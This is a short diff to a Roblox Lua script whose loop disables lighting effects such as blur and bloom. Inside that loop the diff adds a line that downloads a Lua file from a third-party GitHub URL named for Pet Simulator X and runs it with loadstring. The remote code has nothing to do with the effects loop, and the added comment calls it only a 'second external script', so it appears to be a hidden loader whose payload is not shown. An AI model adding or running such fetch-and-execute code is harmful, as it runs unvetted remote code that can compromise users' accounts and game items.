@@ -67,7 +67,10 @@ for i, e in pairs(l:GetChildren()) do
 if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
 
 e.Enabled = false
+wait(1) -- Adjust the duration as needed
 
+-- Load the second external script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
 end
 
 end
